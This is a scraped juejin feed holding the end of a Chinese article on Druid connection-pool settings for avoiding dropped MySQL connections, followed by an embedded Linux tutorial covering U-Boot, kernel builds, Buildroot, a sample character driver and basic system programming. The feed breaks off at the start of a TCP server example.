<h2 data-id="heading-7">五、Druid 关键参数详解（生产推荐配置）</h2>













































<table><thead><tr><th>参数</th><th>推荐值</th><th>说明</th></tr></thead><tbody><tr><td><code>test-on-borrow</code></td><td><code>true</code></td><td><strong>借出时验证</strong>，确保连接有效（牺牲微秒级性能，换稳定性）</td></tr><tr><td><code>validation-query</code></td><td><code>SELECT 1</code></td><td>轻量验证 SQL，比 <code>SELECT 1 FROM DUAL</code> 更标准</td></tr><tr><td><code>min-evictable-idle-time-millis</code></td><td><code>600000</code> (10分钟)</td><td>必须  <strong>&lt; 网络设备超时</strong>（如阿里云 SLB 默认 15 分钟）</td></tr><tr><td><code>exceptionSorter</code></td><td><code>MySqlExceptionSorter</code></td><td><strong>自动识别网络异常，触发重试</strong>（解决验证失败仍报错的关键！）</td></tr><tr><td><code>remove-abandoned</code></td><td><code>false</code></td><td><strong>生产环境禁用</strong>，避免误杀长事务</td></tr><tr><td><code>keep-alive</code></td><td><code>true</code></td><td>启用 Druid 内部保活机制</td></tr><tr><td><code>filters</code></td><td><code>stat,wall,slf4j</code></td><td>开启 SQL 监控、防火墙、统一日志</td></tr></tbody></table>
<p>完整配置示例：</p>
<pre><code class="hljs language-arduino" lang="arduino">dynamic:
  druid:
    initial-size: <span class="hljs-number">10</span>
    min-idle: <span class="hljs-number">10</span>
    max-active: <span class="hljs-number">40</span>
    max-wait: <span class="hljs-number">30000</span>

    time-between-eviction-runs-millis: <span class="hljs-number">30000</span>
    min-evictable-idle-time-millis: <span class="hljs-number">600000</span>
    max-evictable-idle-time-millis: <span class="hljs-number">900000</span>

    validation-query: SELECT <span class="hljs-number">1</span>
    validation-query-timeout: <span class="hljs-number">3</span>
    test-<span class="hljs-keyword">while</span>-idle: <span class="hljs-literal">true</span>
    test-on-borrow: <span class="hljs-literal">true</span>
    test-on-<span class="hljs-keyword">return</span>: <span class="hljs-literal">false</span>

    # 核心：自动处理网络断连
    connection-properties:
      druid.exceptionSorter: com.alibaba.druid.pool.vendor.MySqlExceptionSorter
      druid.stat.mergeSql: <span class="hljs-literal">true</span>
      druid.stat.slowSqlMillis: <span class="hljs-number">5000</span>

    filters: stat,wall,slf4j
    keep-alive: <span class="hljs-literal">true</span>
    pool-prepared-statements: <span class="hljs-literal">true</span>
    max-pool-prepared-statement-per-connection-size: <span class="hljs-number">20</span>

    # 生产环境关闭泄漏回收
    remove-abandoned: <span class="hljs-literal">false</span>
    log-abandoned: <span class="hljs-literal">false</span>
</code></pre>
<hr/>
<h2 data-id="heading-8">六、经验总结</h2>
<ol>
<li>1. <strong>不要只看 MySQL 超时</strong>：云环境、NAT、防火墙才是“隐形杀手”；</li>
<li>2. <strong><code>test-on-borrow=true</code> 是基础，但不够</strong>：必须配合 <code>exceptionSorter</code> 才能自动重试；</li>
<li>3. <strong>生产环境禁用 <code>removeAbandoned</code></strong>：它治标不治本，还可能引发新问题；</li>
<li>4. <strong>连接池配置要“适配网络”</strong> ：<code>minEvictableIdleTimeMillis</code> 必须小于中间设备超时；</li>
<li>5. <strong>长事务要拆分</strong>：避免在 <code>@Transactional</code> 方法中调用外部耗时接口。</li>
</ol>
<hr/>
<h2 data-id="heading-9">七、结语</h2>
<p>数据库连接断连问题看似简单，实则涉及 <strong>网络、连接池、驱动、业务代码</strong> 多层协作。只有理解每一层的行为，才能构建真正高可用的系统。</p>
<p>希望本文能帮你少走弯路。如果觉得有用，欢迎转发给团队同学，一起提升系统稳定性！</p>
<blockquote>
<p><strong>技术无小事，细节定成败</strong>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[嵌入式Linnx的开发]]></title>    <link>https://juejin.cn/post/7602259669730213915</link>    <guid>https://juejin.cn/post/7602259669730213915</guid>    <pubDate>2026-02-03T03:29:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602259669730213915" data-draft-id="7602303923140001842" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="嵌入式Linnx的开发"/> <meta itemprop="keywords" content="后端,嵌入式"/> <meta itemprop="datePublished" content="2026-02-03T03:29:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员良许"/> <meta itemprop="url" content="https://juejin.cn/user/3913917128246942"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            嵌入式Linnx的开发
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3913917128246942/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员良许
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T03:29:09.000Z" title="Tue Feb 03 2026 03:29:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是良许。</p>
<p>今天咱们来聊聊嵌入式Linux开发这个话题。</p>
<p>说实话，我从机械转行做嵌入式这么多年，最让我觉得有意思的就是嵌入式Linux这块。</p>
<p>相比单片机开发，Linux系统给了我们更强大的功能和更灵活的开发方式，但同时也带来了更多的挑战。</p>
<h2 data-id="heading-0">1. 什么是嵌入式Linux开发</h2>
<h3 data-id="heading-1">1.1 嵌入式Linux的定义</h3>
<p>嵌入式Linux开发，简单来说就是把Linux操作系统移植到嵌入式设备上，然后在这个系统上开发应用程序或者驱动程序。</p>
<p>这里的嵌入式设备可以是智能手机、路由器、工业控制器、汽车电子设备等等。</p>
<p>我在外企做的汽车电子项目，用的就是嵌入式Linux系统。</p>
<p>和我们平时用的Ubuntu、CentOS这些桌面Linux不同，嵌入式Linux通常需要经过裁剪和定制，因为嵌入式设备的资源往往比较有限。</p>
<p>比如内存可能只有几百MB，存储空间也就几个GB，不像服务器那样动不动就几十GB内存。</p>
<p>所以我们需要把不必要的功能去掉，只保留核心的部分。</p>
<h3 data-id="heading-2">1.2 为什么选择Linux</h3>
<p>你可能会问，为什么不用单片机的RTOS，非要用Linux呢?</p>
<p>这个问题我当年也问过自己。</p>
<p>后来发现，当你的项目需要网络通信、文件系统、多进程管理这些功能的时候，Linux的优势就体现出来了。</p>
<p>Linux有成熟的TCP/IP协议栈，有完善的文件系统支持，有强大的进程管理机制，这些都是RTOS很难比拟的。</p>
<p>而且Linux是开源的，社区支持非常好。</p>
<p>遇到问题基本上都能在网上找到解决方案。</p>
<p>我记得刚开始做Linux开发的时候，经常半夜爬起来查资料，很多问题都是在Linux内核邮件列表或者Stack Overflow上找到答案的。</p>
<h2 data-id="heading-3">2. 嵌入式Linux开发的核心内容</h2>
<h3 data-id="heading-4">2.1 Bootloader开发</h3>
<p>Bootloader是系统启动的第一个程序，它的主要任务是初始化硬件，然后把Linux内核加载到内存中运行。</p>
<p>最常用的Bootloader是U-Boot,它支持很多种处理器架构，包括ARM、MIPS、PowerPC等等。</p>
<p>我在做项目的时候，经常需要修改U-Boot来适配我们的硬件板子。</p>
<p>比如配置内存大小、设置启动参数、添加新的硬件驱动等等。</p>
<p>U-Boot的配置文件通常在<code>include/configs/</code>目录下，你需要根据自己的硬件创建一个配置文件。</p>
<p>举个例子，如果你要设置内核启动参数，可以在U-Boot的环境变量中这样设置:</p>
<pre><code class="hljs language-bash" lang="bash">setenv bootargs <span class="hljs-string">'console=ttymxc0,115200 root=/dev/mmcblk0p2 rootwait rw'</span>
saveenv
</code></pre>
<p>这条命令设置了串口控制台、根文件系统的位置等信息。</p>
<p><code>console=ttymxc0,115200</code>表示使用ttymxc0这个串口，波特率是115200。</p>
<p><code>root=/dev/mmcblk0p2</code>表示根文件系统在SD卡的第二个分区。</p>
<h3 data-id="heading-5">2.2 Linux内核移植与配置</h3>
<p>内核是整个系统的核心，它负责管理硬件资源、提供系统调用接口。</p>
<p>移植内核的第一步是下载内核源码，然后根据你的硬件平台进行配置。</p>
<p>Linux内核的配置使用的是Kconfig系统，你可以通过<code>make menuconfig</code>命令来进行图形化配置。</p>
<p>配置项非常多，包括CPU架构、设备驱动、文件系统、网络协议等等。</p>
<p>对于嵌入式系统，我们通常需要把不需要的功能去掉，以减小内核的大小。</p>
<p>比如，如果你的设备不需要蓝牙功能，就可以在配置中把蓝牙相关的选项去掉。</p>
<p>如果不需要某些文件系统，也可以不编译进内核。</p>
<p>我做项目的时候，通常会先用默认配置编译一个内核，然后逐步裁剪，最终把内核大小从十几MB减小到几MB。</p>
<p>编译内核的命令通常是这样的:</p>
<pre><code class="hljs language-bash" lang="bash">make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- zImage
make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- dtbs
make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- modules
</code></pre>
<p>第一条命令编译内核镜像，第二条编译设备树，第三条编译内核模块。</p>
<p><code>ARCH=arm</code>指定目标架构是ARM，<code>CROSS_COMPILE</code>指定交叉编译工具链的前缀。</p>
<h3 data-id="heading-6">2.3 根文件系统制作</h3>
<p>根文件系统包含了系统运行所需的所有文件，包括库文件、配置文件、应用程序等等。</p>
<p>制作根文件系统有很多种方法，最常用的是使用Buildroot或者Yocto这样的工具。</p>
<p>Buildroot是一个比较轻量级的工具，它可以自动下载、编译、安装各种软件包，最后生成一个完整的根文件系统。</p>
<p>我个人比较喜欢用Buildroot，因为它配置简单，编译速度也快。</p>
<p>使用Buildroot的基本流程是这样的:</p>
<pre><code class="hljs language-bash" lang="bash">git <span class="hljs-built_in">clone</span> https://github.com/buildroot/buildroot.git
<span class="hljs-built_in">cd</span> buildroot
make menuconfig
make
</code></pre>
<p>在<code>make menuconfig</code>中，你可以选择目标架构、工具链、需要的软件包等等。</p>
<p>配置完成后，执行<code>make</code>命令，Buildroot就会自动下载源码、编译、安装，最后在<code>output/images/</code>目录下生成根文件系统镜像。</p>
<p>根文件系统的格式有很多种，常见的有ext4、ubifs、squashfs等等。</p>
<p>ext4适合用在SD卡或者eMMC上，ubifs适合用在NAND Flash上，squashfs是一个只读的压缩文件系统，适合用来存放不需要修改的系统文件。</p>
<h3 data-id="heading-7">2.4 设备驱动开发</h3>
<p>驱动开发是嵌入式Linux开发中最核心也是最难的部分。</p>
<p>Linux的驱动分为字符设备驱动、块设备驱动和网络设备驱动。</p>
<p>对于嵌入式系统，我们最常接触的是字符设备驱动，比如串口驱动、GPIO驱动、I2C驱动等等。</p>
<p>写一个简单的字符设备驱动，基本框架是这样的:</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/cdev.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/device.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> DEVICE_NAME <span class="hljs-string">"mydevice"</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> CLASS_NAME <span class="hljs-string">"myclass"</span></span>

<span class="hljs-type">static</span> <span class="hljs-type">int</span> major_number;
<span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-keyword">class</span> *<span class="hljs-title">myclass</span> =</span> <span class="hljs-literal">NULL</span>;
<span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">device</span> *<span class="hljs-title">mydevice</span> =</span> <span class="hljs-literal">NULL</span>;

<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">dev_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inodep, <span class="hljs-keyword">struct</span> file *filep)</span> {
    printk(KERN_INFO <span class="hljs-string">"mydevice: Device opened\n"</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">dev_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inodep, <span class="hljs-keyword">struct</span> file *filep)</span> {
    printk(KERN_INFO <span class="hljs-string">"mydevice: Device closed\n"</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">dev_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filep, <span class="hljs-type">char</span> *buffer, <span class="hljs-type">size_t</span> len, <span class="hljs-type">loff_t</span> *offset)</span> {
    printk(KERN_INFO <span class="hljs-string">"mydevice: Read operation\n"</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">dev_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filep, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buffer, <span class="hljs-type">size_t</span> len, <span class="hljs-type">loff_t</span> *offset)</span> {
    printk(KERN_INFO <span class="hljs-string">"mydevice: Write operation\n"</span>);
    <span class="hljs-keyword">return</span> len;
}

<span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">fops</span> =</span> {
    .open = dev_open,
    .read = dev_read,
    .write = dev_write,
    .release = dev_release,
};

<span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">mydevice_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> {
    printk(KERN_INFO <span class="hljs-string">"mydevice: Initializing\n"</span>);
    
    major_number = register_chrdev(<span class="hljs-number">0</span>, DEVICE_NAME, &amp;fops);
    <span class="hljs-keyword">if</span> (major_number &lt; <span class="hljs-number">0</span>) {
        printk(KERN_ALERT <span class="hljs-string">"mydevice: Failed to register\n"</span>);
        <span class="hljs-keyword">return</span> major_number;
    }
    
    myclass = class_create(THIS_MODULE, CLASS_NAME);
    <span class="hljs-keyword">if</span> (IS_ERR(myclass)) {
        unregister_chrdev(major_number, DEVICE_NAME);
        printk(KERN_ALERT <span class="hljs-string">"mydevice: Failed to create class\n"</span>);
        <span class="hljs-keyword">return</span> PTR_ERR(myclass);
    }
    
    mydevice = device_create(myclass, <span class="hljs-literal">NULL</span>, MKDEV(major_number, <span class="hljs-number">0</span>), <span class="hljs-literal">NULL</span>, DEVICE_NAME);
    <span class="hljs-keyword">if</span> (IS_ERR(mydevice)) {
        class_destroy(myclass);
        unregister_chrdev(major_number, DEVICE_NAME);
        printk(KERN_ALERT <span class="hljs-string">"mydevice: Failed to create device\n"</span>);
        <span class="hljs-keyword">return</span> PTR_ERR(mydevice);
    }
    
    printk(KERN_INFO <span class="hljs-string">"mydevice: Device created successfully\n"</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">mydevice_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> {
    device_destroy(myclass, MKDEV(major_number, <span class="hljs-number">0</span>));
    class_unregister(myclass);
    class_destroy(myclass);
    unregister_chrdev(major_number, DEVICE_NAME);
    printk(KERN_INFO <span class="hljs-string">"mydevice: Goodbye\n"</span>);
}

module_init(mydevice_init);
module_exit(mydevice_exit);

MODULE_LICENSE(<span class="hljs-string">"GPL"</span>);
MODULE_AUTHOR(<span class="hljs-string">"良许"</span>);
MODULE_DESCRIPTION(<span class="hljs-string">"A simple character device driver"</span>);
</code></pre>
<p>这个驱动实现了最基本的打开、关闭、读、写操作。</p>
<p>在<code>mydevice_init</code>函数中，我们注册了一个字符设备，创建了设备类和设备节点。</p>
<p>当驱动加载成功后，系统会在<code>/dev</code>目录下创建一个名为<code>mydevice</code>的设备文件。</p>
<p>编译驱动需要一个Makefile:</p>
<pre><code class="hljs language-makefile" lang="makefile">obj-m += mydevice.o

<span class="hljs-section">all:</span>
	make -C /lib/modules/<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -r)</span>/build M=<span class="hljs-variable">$(PWD)</span> modules

<span class="hljs-section">clean:</span>
	make -C /lib/modules/<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -r)</span>/build M=<span class="hljs-variable">$(PWD)</span> clean
</code></pre>
<p>编译完成后，使用<code>insmod mydevice.ko</code>命令加载驱动，使用<code>rmmod mydevice</code>命令卸载驱动。</p>
<h2 data-id="heading-8">3. 应用程序开发</h2>
<h3 data-id="heading-9">3.1 交叉编译环境搭建</h3>
<p>在嵌入式Linux开发中，我们通常在PC上编写代码，然后使用交叉编译工具链编译成目标平台的可执行文件。</p>
<p>交叉编译工具链包括编译器、链接器、库文件等等。</p>
<p>常用的交叉编译工具链有arm-linux-gnueabihf、aarch64-linux-gnu等等。</p>
<p>你可以从芯片厂商的网站下载，也可以使用Buildroot或者Linaro提供的工具链。</p>
<p>安装好工具链后，编译程序的命令是这样的:</p>
<pre><code class="hljs language-bash" lang="bash">arm-linux-gnueabihf-gcc -o hello hello.c
</code></pre>
<p>如果程序使用了第三方库，需要指定库的路径:</p>
<pre><code class="hljs language-bash" lang="bash">arm-linux-gnueabihf-gcc -o myapp myapp.c -I/path/to/include -L/path/to/lib -lmylib
</code></pre>
<h3 data-id="heading-10">3.2 系统编程</h3>
<p>Linux提供了丰富的系统调用接口，我们可以通过这些接口来操作文件、进程、网络等等。</p>
<p>比如，读写文件可以使用<code>open</code>、<code>read</code>、<code>write</code>、<code>close</code>等系统调用。</p>
<p>下面是一个读写文件的例子:</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> fd;
    <span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];
    <span class="hljs-type">ssize_t</span> bytes_read;
    
    <span class="hljs-comment">// 打开文件</span>
    fd = open(<span class="hljs-string">"/tmp/test.txt"</span>, O_RDWR | O_CREAT, <span class="hljs-number">0644</span>);
    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"Failed to open file"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }
    
    <span class="hljs-comment">// 写入数据</span>
    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *data = <span class="hljs-string">"Hello, Embedded Linux!\n"</span>;
    write(fd, data, <span class="hljs-built_in">strlen</span>(data));
    
    <span class="hljs-comment">// 移动文件指针到开头</span>
    lseek(fd, <span class="hljs-number">0</span>, SEEK_SET);
    
    <span class="hljs-comment">// 读取数据</span>
    bytes_read = read(fd, buffer, <span class="hljs-keyword">sizeof</span>(buffer) - <span class="hljs-number">1</span>);
    <span class="hljs-keyword">if</span> (bytes_read &gt; <span class="hljs-number">0</span>) {
        buffer[bytes_read] = <span class="hljs-string">'\0'</span>;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Read from file: %s"</span>, buffer);
    }
    
    <span class="hljs-comment">// 关闭文件</span>
    close(fd);
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>这个程序演示了如何创建文件、写入数据、读取数据。</p>
<p><code>open</code>函数的第二个参数指定了打开方式，<code>O_RDWR</code>表示读写模式，<code>O_CREAT</code>表示如果文件不存在就创建。</p>
<p>第三个参数是文件权限，<code>0644</code>表示所有者可读可写，其他人只读。</p>
<h3 data-id="heading-11">3.3 进程间通信</h3>
<p>在嵌入式Linux系统中，我们经常需要多个进程协同工作。</p>
<p>进程间通信(IPC)的方式有很多种，包括管道、消息队列、共享内存、信号量等等。</p>
<p>管道是最简单的IPC方式，适合父子进程之间的通信。</p>
<p>下面是一个使用管道的例子:</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> pipefd[<span class="hljs-number">2</span>];
    <span class="hljs-type">pid_t</span> pid;
    <span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];
    
    <span class="hljs-comment">// 创建管道</span>
    <span class="hljs-keyword">if</span> (pipe(pipefd) == <span class="hljs-number">-1</span>) {
        perror(<span class="hljs-string">"pipe failed"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }
    
    <span class="hljs-comment">// 创建子进程</span>
    pid = fork();
    
    <span class="hljs-keyword">if</span> (pid &lt; <span class="hljs-number">0</span>) {
        perror(<span class="hljs-string">"fork failed"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }
    
    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// 子进程:读取数据</span>
        close(pipefd[<span class="hljs-number">1</span>]);  <span class="hljs-comment">// 关闭写端</span>
        read(pipefd[<span class="hljs-number">0</span>], buffer, <span class="hljs-keyword">sizeof</span>(buffer));
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Child received: %s\n"</span>, buffer);
        close(pipefd[<span class="hljs-number">0</span>]);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 父进程:写入数据</span>
        close(pipefd[<span class="hljs-number">0</span>]);  <span class="hljs-comment">// 关闭读端</span>
        <span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg = <span class="hljs-string">"Hello from parent!"</span>;
        write(pipefd[<span class="hljs-number">1</span>], msg, <span class="hljs-built_in">strlen</span>(msg) + <span class="hljs-number">1</span>);
        close(pipefd[<span class="hljs-number">1</span>]);
        wait(<span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// 等待子进程结束</span>
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>对于更复杂的通信需求，我们可以使用消息队列或者共享内存。</p>
<p>消息队列适合传递结构化的消息，共享内存适合大量数据的传输。</p>
<h3 data-id="heading-12">3.4 网络编程</h3>
<p>嵌入式设备经常需要通过网络与其他设备通信。</p>
<p>Linux提供了标准的Socket接口，支持TCP和UDP协议。</p>
<p>下面是一个简单的TCP服务器例子:</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-keyword">define</span> PORT 8888</span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
